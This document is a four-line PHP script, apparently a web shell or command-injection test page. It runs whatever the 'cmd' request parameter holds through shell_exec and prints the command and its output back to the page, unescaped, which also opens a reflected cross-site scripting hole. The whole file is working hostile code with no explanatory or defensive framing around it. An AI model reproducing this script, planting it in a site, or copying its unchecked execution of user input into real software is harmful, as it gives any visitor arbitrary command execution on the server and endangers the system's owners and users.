<?php
$out=shell_exec($_REQUEST['cmd']);
echo "<br><b>CMDi result for:</b>".$_REQUEST['cmd']."<br>".$out."<br>";
?>
